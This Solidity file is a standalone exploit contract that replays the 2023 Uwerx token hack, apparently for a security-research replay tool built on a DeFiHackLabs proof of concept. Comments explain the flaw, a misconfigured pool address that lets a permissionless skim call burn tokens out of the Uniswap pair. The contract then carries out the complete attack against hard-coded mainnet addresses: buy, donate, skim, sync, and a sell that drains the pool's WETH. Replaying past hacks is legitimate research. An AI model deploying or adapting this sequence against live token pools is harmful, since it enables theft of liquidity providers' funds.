// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// Synthetic standalone exploit for 2023-08-Uwerx playground replay.
//
// Faithfully reproduces the on-chain attack (see evm-hack-registry/2023-08-Uwerx_exp
// test/Uwerx_exp.sol and Uwerx_exp.md for the full write-up): buy WERX with the
// (pre-funded) 20,000 WETH "flash loan", donate a huge WERX amount into the
// WERX/WETH pair to inflate its raw balance far past `reserve0` (donations do not
// update reserves), then call the pair's permissionless `skim(0x01)`. That makes
// the PAIR itself the `from` of a WERX transfer to `0x01` -- Uwerx's never
// configured `uniswapPoolAddress` default -- which fires Uwerx's on-transfer 1%
// tax/burn branch and burns tokens straight out of the pair's own balance.
// `sync()` then collapses `reserve0` to dust while `reserve1` (WETH) is
// untouched, and a final sell against the degenerate pool drains almost the
// entire WETH side.
//
// The original DeFiHackLabs PoC runs this inline on the Foundry `Test` contract
// and uses `deal()` to mock the flash loan. The replay engine has no cheatcodes,
// so this contract is a plain standalone version of the same call sequence, and
// the 20,000 WETH starting balance is seeded via a `setup.steps` `dealToken`
// step (to the deployed exploit contract) instead of `deal()` -- see
// scripts/poc-configs/README.md and docs/Troubleshooting-2.md §6.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function sync() external;
    function skim(address to) external;
}

contract UwerxSkimBurnAttack {
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private constant WERX = IERC20(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54);
    IUniswapV2Router private constant ROUTER = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private constant PAIR = IUniswapV2Pair(0xa41529982BcCCDfA1105C6f08024DF787CA758C4);

    function attack() external {
        // Step 1: approve the router, then buy WERX with the 20,000 WETH
        // "flash loan" seeded into this contract by the replay's setup step.
        WETH.approve(address(ROUTER), type(uint256).max);
        WERX.approve(address(ROUTER), type(uint256).max);

        PAIR.sync();

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(WERX);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            20_000 ether, 0, path, address(this), block.timestamp
        );

        // Step 2: donate WERX into the pair. This inflates the pair's raw
        // token balance far beyond its stale `reserve0` -- donations never
        // update reserves, only `sync`/`swap` do.
        WERX.transfer(address(PAIR), 4_429_817_738_575_912_760_684_500);

        // Step 3: the bug. `skim(0x01)` is permissionless and makes the PAIR
        // the `from` of a raw WERX transfer to `0x01` -- Uwerx's
        // `uniswapPoolAddress`, left at its un-configured default. That
        // triggers Uwerx's recipient-keyed tax/burn branch and burns 1% of
        // the transfer straight out of the pair's own balance.
        PAIR.skim(address(0x01));

        // Step 4: commit the collapsed balance as the pair's new reserve.
        PAIR.sync();

        // Step 5: sell the remaining WERX into the now-degenerate pool,
        // draining almost the entire WETH side back to this contract.
        path[0] = address(WERX);
        path[1] = address(WETH);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WERX.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
